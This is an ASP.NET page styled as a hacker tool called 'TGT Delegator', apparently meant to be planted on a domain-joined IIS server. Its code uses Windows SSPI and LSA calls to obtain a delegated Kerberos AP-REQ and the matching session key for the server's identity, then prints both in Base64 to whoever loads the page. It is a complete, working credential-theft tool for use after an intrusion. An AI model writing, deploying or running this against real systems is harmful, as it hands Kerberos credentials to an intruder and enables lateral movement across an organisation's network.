<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.NetworkInformation" %>
<script runat="server">

const int SECPKG_CRED_OUTBOUND    = 2;
const int SECURITY_NATIVE_DREP    = 0x10;
const int SECBUFFER_TOKEN         = 2;
const int SEC_E_OK                = 0x00000000;
const int SEC_I_CONTINUE_NEEDED   = 0x00090312;

const int ISC_REQ_DELEGATE        = 0x00000001;
const int ISC_REQ_MUTUAL_AUTH     = 0x00000002;
const int ISC_REQ_REPLAY_DETECT   = 0x00000004;
const int ISC_REQ_SEQUENCE_DETECT = 0x00000008;
const int ISC_REQ_CONFIDENTIALITY = 0x00000010;
const int ISC_REQ_ALLOCATE_MEMORY = 0x00000100;
const int ISC_REQ_CONNECTION      = 0x00000800;

const int ISC_REQ_FLAGS = ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_CONFIDENTIALITY |
                          ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT |
                          ISC_REQ_CONNECTION | ISC_REQ_ALLOCATE_MEMORY;

const int  KERB_RETRIEVE_ENCODED_TICKET_MESSAGE = 8;
const uint KERB_RETRIEVE_TICKET_USE_CACHE_ONLY  = 0x2;

[StructLayout(LayoutKind.Sequential)]
struct LUID { public uint LowPart; public int HighPart; }

[StructLayout(LayoutKind.Explicit)]
struct UNICODE_STRING
{
    [FieldOffset(0)] public ushort Length;
    [FieldOffset(2)] public ushort MaximumLength;
    [FieldOffset(8)] public IntPtr Buffer;
}

[StructLayout(LayoutKind.Sequential)]
struct LSA_STRING_OUT { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }

[StructLayout(LayoutKind.Sequential)]
struct LSA_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }

[StructLayout(LayoutKind.Sequential)]
struct KERB_RETRIEVE_TKT_REQUEST
{
    public int            MessageType;
    public LUID           LogonId;
    public UNICODE_STRING TargetName;
    public uint           TicketFlags;
    public uint           CacheOptions;
    public int            EncryptionType;
    public SecHandle      CredentialsHandle;
}

[StructLayout(LayoutKind.Sequential)]
struct KERB_CRYPTO_KEY { public int KeyType; public int Length; public IntPtr Value; }

[StructLayout(LayoutKind.Sequential)]
struct KERB_EXTERNAL_TICKET
{
    public IntPtr          ServiceName;
    public IntPtr          TargetName;
    public IntPtr          ClientName;
    public LSA_STRING_OUT  DomainName;
    public LSA_STRING_OUT  TargetDomainName;
    public LSA_STRING_OUT  AltTargetDomainName;
    public KERB_CRYPTO_KEY SessionKey;
    public uint            TicketFlags;
    public uint            Flags;
    public long            KeyExpirationTime;
    public long            StartTime;
    public long            EndTime;
    public long            RenewUntil;
    public long            TimeSkew;
    public int             EncodedTicketSize;
    public IntPtr          EncodedTicket;
}

[StructLayout(LayoutKind.Sequential)]
struct KERB_RETRIEVE_TKT_RESPONSE { public KERB_EXTERNAL_TICKET Ticket; }

[StructLayout(LayoutKind.Sequential)]
public struct SecHandle { public IntPtr dwLower; public IntPtr dwUpper; }

[StructLayout(LayoutKind.Sequential)]
public struct SecBuffer { public int cbBuffer; public int BufferType; public IntPtr pvBuffer; }

[StructLayout(LayoutKind.Sequential)]
public struct SecBufferDesc { public int ulVersion; public int cBuffers; public IntPtr pBuffers; }

[DllImport("secur32.dll", CharSet = CharSet.Auto)]
static extern int AcquireCredentialsHandle(
    string pszPrincipal, string pszPackage, int fCredentialUse,
    IntPtr pAuthenticationID, IntPtr pAuthData, int pGetKeyFn, IntPtr pvGetKeyArgument,
    out SecHandle phCredential, out long ptsExpiry);

[DllImport("secur32.dll", CharSet = CharSet.Auto)]
static extern int InitializeSecurityContext(
    ref SecHandle phCredential, IntPtr phContext, string pszTargetName,
    int fContextReq, int Reserved1, int TargetDataRep, IntPtr pInput, int Reserved2,
    out SecHandle phNewContext, out SecBufferDesc pOutput,
    out uint pfContextAttr, out long ptsExpiry);

[DllImport("secur32.dll", CharSet = CharSet.Auto)]
static extern int FreeCredentialsHandle(ref SecHandle phCredential);

[DllImport("secur32.dll", CharSet = CharSet.Auto)]
static extern int DeleteSecurityContext(ref SecHandle phContext);

[DllImport("secur32.dll", CharSet = CharSet.Ansi)]
static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

[DllImport("secur32.dll", SetLastError = false)]
static extern int LsaLookupAuthenticationPackage(
    IntPtr LsaHandle, ref LSA_STRING Package, out int AuthenticationPackage);

[DllImport("secur32.dll", SetLastError = false)]
static extern int LsaCallAuthenticationPackage(
    IntPtr LsaHandle, int AuthenticationPackage,
    IntPtr ProtocolSubmitBuffer, int SubmitBufferLength,
    out IntPtr ProtocolReturnBuffer, out int ReturnBufferLength, out int ProtocolStatus);

[DllImport("secur32.dll")]
static extern uint LsaFreeReturnBuffer(IntPtr Buffer);

[DllImport("secur32.dll")]
static extern int LsaDeregisterLogonProcess(IntPtr LsaHandle);

static void ZeroMemory(IntPtr ptr, int size)
{
    for (int i = 0; i < size; i++) Marshal.WriteByte(ptr, i, 0);
}

static string EtypeToString(int etype)
{
    switch (etype)
    {
        case 1:  return "DES-CBC-CRC";
        case 3:  return "DES-CBC-MD5";
        case 17: return "AES128-CTS-HMAC-SHA1-96";
        case 18: return "AES256-CTS-HMAC-SHA1-96";
        case 23: return "RC4-HMAC (ARCFOUR)";
        case 24: return "RC4-HMAC-EXP";
        default: return "UNKNOWN (" + etype + ")";
    }
}


static string GetDomain()
{
   
    string domain = IPGlobalProperties.GetIPGlobalProperties().DomainName;
    return string.IsNullOrEmpty(domain) ? null : domain;
}

static string AutoDetectDcSpn(StringBuilder log)
{
    string domain = GetDomain();
    if (string.IsNullOrEmpty(domain))
    {
        log.Append("<div class='flash error'>[-] Machine does not appear to be domain-joined (no DNS suffix found).</div>");
        return null;
    }

    log.Append("<div class='info'>[*] Domain: <b>" + domain + "</b></div>");

    try
    {
        
        IPAddress[] addrs = Dns.GetHostAddresses(domain);
        if (addrs.Length > 0)
        {
            
            string dcFqdn = Dns.GetHostEntry(addrs[0]).HostName;
            log.Append("<div class='info'>[*] Resolved DC: <b>" + dcFqdn + "</b></div>");
            return "ldap/" + dcFqdn;
        }
    }
    catch (Exception ex)
    {
        log.Append("<div class='info'>[*] DNS resolve failed (" + ex.Message + "), falling back to dc." + domain + "</div>");
    }

   
    return "ldap/dc." + domain;
}

static string ResolveTargetSpn(HttpRequest request, StringBuilder log)
{
    string host = request.QueryString["target"];

    if (!string.IsNullOrEmpty(host))
    {
        host = host.Trim();

        // Short hostname supplied — no dots means we need to append the domain
        if (!host.Contains("."))
        {
            string domain = GetDomain();
            if (!string.IsNullOrEmpty(domain))
            {
                host = host + "." + domain;
                log.Append("<div class='info'>[*] Short hostname detected, resolved to <b>" + host + "</b></div>");
            }
            else
            {
                log.Append("<div class='flash error'>[-] Could not detect domain suffix to expand short hostname '" + host + "'.</div>");
                return null;
            }
        }

        return "ldap/" + host;
    }

    // No ?target= supplied — auto-detect
    log.Append("<div class='info'>[*] No target specified, attempting auto-detect...</div>");
    return AutoDetectDcSpn(log);
}

protected void Page_Load(object sender, EventArgs e)
{
    var sb = new StringBuilder();

    // -- Resolve SPN -----------------------------------------------------------
    string targetSpn = ResolveTargetSpn(Request, sb);

    if (string.IsNullOrEmpty(targetSpn))
    {
        sb.Append("<div class='flash error'>[-] Could not determine target SPN. " +
                  "Pass ?target=hostname (e.g. ?target=winbox2) and try again.</div>");
        PageOutput = sb.ToString();
        return;
    }

    // Show running context and resolved SPN
    string spnSource = !string.IsNullOrEmpty(Request.QueryString["target"])
                     ? "?target=" + Request.QueryString["target"]
                     : "auto-detected";

    
    sb.Append("<br><br><font color=#ff9933><b>Target SPN: </b></font><span style='color:white;'>" +
              targetSpn + "</span> (" + spnSource + ")");
   



    SecHandle credHandle    = new SecHandle();
    SecHandle newContext    = new SecHandle();
    IntPtr    pvBuffer      = IntPtr.Zero;
    IntPtr    pOutSecBuffer = IntPtr.Zero;
    IntPtr    lsaHandle     = IntPtr.Zero;
    IntPtr    pkgBuf        = IntPtr.Zero;
    IntPtr    unmanagedAddr = IntPtr.Zero;
    IntPtr    retBuffer     = IntPtr.Zero;
    bool      contextValid  = false;

    try
    {
        // -- AP-REQ via SSPI ---------------------------------------------------
        long tsExpiry;
        int status = AcquireCredentialsHandle(
            null, "Kerberos", SECPKG_CRED_OUTBOUND,
            IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero,
            out credHandle, out tsExpiry);

        if (status != 0)
        {
            sb.Append("<div class='flash error'>[-] AcquireCredentialsHandle failed: 0x" + status.ToString("X8") + "</div>");
            PageOutput = sb.ToString(); return;
        }

        pvBuffer = Marshal.AllocHGlobal(12288);
        SecBuffer outSecBuffer  = new SecBuffer();
        outSecBuffer.cbBuffer   = 12288;
        outSecBuffer.BufferType = SECBUFFER_TOKEN;
        outSecBuffer.pvBuffer   = pvBuffer;

        pOutSecBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SecBuffer)));
        Marshal.StructureToPtr(outSecBuffer, pOutSecBuffer, false);

        SecBufferDesc secBufferDesc = new SecBufferDesc();
        secBufferDesc.ulVersion = 0;
        secBufferDesc.cBuffers  = 1;
        secBufferDesc.pBuffers  = pOutSecBuffer;

        uint contextAttr;
        long expiry;

        status = InitializeSecurityContext(
            ref credHandle, IntPtr.Zero, targetSpn,
            ISC_REQ_FLAGS, 0, SECURITY_NATIVE_DREP,
            IntPtr.Zero, 0,
            out newContext, out secBufferDesc, out contextAttr, out expiry);

        if (status != SEC_E_OK && status != SEC_I_CONTINUE_NEEDED)
        {
            sb.Append("<div class='flash error'>[-] InitializeSecurityContext failed: 0x" + status.ToString("X8") + "</div>");
            PageOutput = sb.ToString(); return;
        }
        contextValid = true;

        if ((contextAttr & (uint)ISC_REQ_DELEGATE) == 0)
        {
            sb.Append("<div class='flash error'>[-] Delegation not granted — target may not allow unconstrained delegation.</div>");
            PageOutput = sb.ToString(); return;
        }

        SecBuffer filled     = (SecBuffer)Marshal.PtrToStructure(pOutSecBuffer, typeof(SecBuffer));
        byte[]    apReqBytes = new byte[filled.cbBuffer];
        Marshal.Copy(filled.pvBuffer, apReqBytes, 0, filled.cbBuffer);

        sb.Append("<br><br><table align=left style='border: 0px;'><tr><td><font color=#ff9933><b> -=[ AP-REQ (Base64) ]=-</b></font></td></tr></table>");
        sb.Append("<br><br><textarea rows=20 cols='100%'>" + Convert.ToBase64String(apReqBytes) + "</textarea><br>");

        // -- Session key via LSA -----------------------------------------------
        if (LsaConnectUntrusted(out lsaHandle) != 0)
        {
            sb.Append("<div class='flash error'>[-] LsaConnectUntrusted failed.</div>");
            PageOutput = sb.ToString(); return;
        }

        string pkgName = "kerberos";
        pkgBuf = Marshal.StringToHGlobalAnsi(pkgName);
        LSA_STRING lsaStr;
        lsaStr.Length        = (ushort)pkgName.Length;
        lsaStr.MaximumLength = (ushort)(pkgName.Length + 1);
        lsaStr.Buffer        = pkgBuf;

        int authPkg;
        if (LsaLookupAuthenticationPackage(lsaHandle, ref lsaStr, out authPkg) != 0)
        {
            sb.Append("<div class='flash error'>[-] LsaLookupAuthenticationPackage failed.</div>");
            PageOutput = sb.ToString(); return;
        }

        byte[] spnBytes   = Encoding.Unicode.GetBytes(targetSpn);
        int    structSize = Marshal.SizeOf(typeof(KERB_RETRIEVE_TKT_REQUEST));
        int    totalSize  = structSize + spnBytes.Length + 2;

        unmanagedAddr = Marshal.AllocHGlobal(totalSize);
        ZeroMemory(unmanagedAddr, totalSize);

        IntPtr spnPtr = IntPtr.Add(unmanagedAddr, structSize);
        Marshal.Copy(spnBytes, 0, spnPtr, spnBytes.Length);

        Marshal.WriteInt32 (unmanagedAddr,  0, KERB_RETRIEVE_ENCODED_TICKET_MESSAGE);
        Marshal.WriteInt32 (unmanagedAddr,  8, 0);
        Marshal.WriteInt32 (unmanagedAddr, 12, 0);
        Marshal.WriteInt16 (unmanagedAddr, 16, (short)spnBytes.Length);
        Marshal.WriteInt16 (unmanagedAddr, 18, (short)(spnBytes.Length + 2));
        Marshal.WriteIntPtr(unmanagedAddr, 24, spnPtr);
        Marshal.WriteInt32 (unmanagedAddr, 32, 0);
        Marshal.WriteInt32 (unmanagedAddr, 36, (int)KERB_RETRIEVE_TICKET_USE_CACHE_ONLY);
        Marshal.WriteInt32 (unmanagedAddr, 40, 0);

        int retLen, protoStatus;
        int callStatus = LsaCallAuthenticationPackage(
            lsaHandle, authPkg, unmanagedAddr, totalSize,
            out retBuffer, out retLen, out protoStatus);

        if (callStatus != 0 || protoStatus != 0)
        {
            sb.Append("<div class='flash error'>[-] LsaCallAuthenticationPackage failed." +
                      " callStatus: 0x" + callStatus.ToString("X8") +
                      " protoStatus: 0x" + protoStatus.ToString("X8") + "</div>");
            PageOutput = sb.ToString(); return;
        }

        var resp = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(
            retBuffer, typeof(KERB_RETRIEVE_TKT_RESPONSE));

        int    keyType    = resp.Ticket.SessionKey.KeyType;
        int    keyLen     = resp.Ticket.SessionKey.Length;
        byte[] sessionKey = new byte[keyLen];
        Marshal.Copy(resp.Ticket.SessionKey.Value, sessionKey, 0, keyLen);

        sb.Append("<br><br><table align=left style='border: 0px;'>");
        sb.Append("<tr><td ><font color=#ff9933><b> [+] Session Key (Base64)</b></font></td><td>" +
                  Convert.ToBase64String(sessionKey) + "</td></tr>");
        sb.Append("<tr><td><font color=#ff9933><b> [+] Encryption Type</b></font></td><td>" +
                  EtypeToString(keyType) + " (etype " + keyType + ")</td></tr>");
        sb.Append("</table>");
    }
    finally
    {
        if (retBuffer     != IntPtr.Zero) LsaFreeReturnBuffer(retBuffer);
        if (unmanagedAddr != IntPtr.Zero) Marshal.FreeHGlobal(unmanagedAddr);
        if (pkgBuf        != IntPtr.Zero) Marshal.FreeHGlobal(pkgBuf);
        if (lsaHandle     != IntPtr.Zero) LsaDeregisterLogonProcess(lsaHandle);
        if (pvBuffer      != IntPtr.Zero) Marshal.FreeHGlobal(pvBuffer);
        if (pOutSecBuffer != IntPtr.Zero) Marshal.FreeHGlobal(pOutSecBuffer);
        if (contextValid)                 DeleteSecurityContext(ref newContext);
        FreeCredentialsHandle(ref credHandle);
    }

    PageOutput = sb.ToString();
}

public string PageOutput = "";

</script>
<!DOCTYPE html>
<html>
<head>
    <title>Kerberos AP-REQ &amp; Session Key</title>
    <style>
        body {
            font-size: 14px;
            font-family: monospace;
            color: #db996e;
            background: black;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
        }
        label {
            color: #db996e;
            font-weight: bold;
        }
        .flash {
            padding: 15px;
            margin: 10px 0;
            border-radius: 4px;
        }
        .flash.error {
            background-color: #4d1a1a;
            border: 1px solid #ff0000;
            color: #ff6666;
        }
        .info {
            color: #666;
            margin: 2px 0;
            font-size: 12px;
        }
        .section-label {
            color: white;
            margin: 18px 0px 10px;
            display: block;
        }
        .divider {
            text-align: center;
            margin: 6px 0 20px 0;
            font-size: 13px;
        }
        tr {
            border: dashed 1px #333;
            color: #FFF;
        }
        td {
            padding: 3px;
        }
        table {
            border: dashed 2px #333;
            border-color: #333333;
            background-color: #191919;
            color: #FFF;
        }
        textarea {
            border: dashed 2px #333;
            background-color: black;
            font: Fixedsys bold;
            color: #999;
        }
    </style>
</head>
<body>

<table width="100%" cellspacing="0" cellpadding="0">
<tr><td align="center"><font color="#ff9933" size="7" face="comic sans ms"><b>--==[[ TGT Delegator ]]==--</b></font></td></tr>
<tr><td align="center"><font color="#ff9933">##########################################</font><font color="white">#############################################</font><font color="green">#############################################</font></td></tr>
</table><br>

<div class="container">
    <%= PageOutput %>
</div>

</body>
</html>
